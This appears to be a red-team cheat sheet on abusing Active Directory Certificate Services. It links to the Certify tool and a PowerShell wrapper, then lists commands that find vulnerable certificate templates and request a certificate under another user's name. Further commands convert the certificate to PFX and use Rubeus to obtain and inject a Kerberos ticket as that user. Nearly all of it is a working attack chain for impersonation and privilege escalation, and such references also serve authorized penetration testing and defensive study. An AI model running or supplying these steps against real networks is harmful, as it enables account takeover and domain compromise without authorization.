### Source
https://github.com/GhostPack/Certify  
https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Certify.ps1  

### List certificate authorities
```
Certify.exe cas
```

### Get information about certificate environment and find vulnerable certificates (enrollment rights)
```
Certify.exe find /vulnerable
Invoke-Certify find /vulnerable
```

### Request certificate (altUser is the user to impersonate) - use /machine to switch into the current machine context
```
Certify.exe request /ca:"<fqdnCertificateServer>" /template:"<templateName>" /altname:"<altUser>"
```

### Convert pem file to pfx file using linux
```
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out <file>.pfx
```

### Impersonate user
```
Rubeus.exe asktgt /user:<altUser> /certificate:<file>.pfx /ptt
```

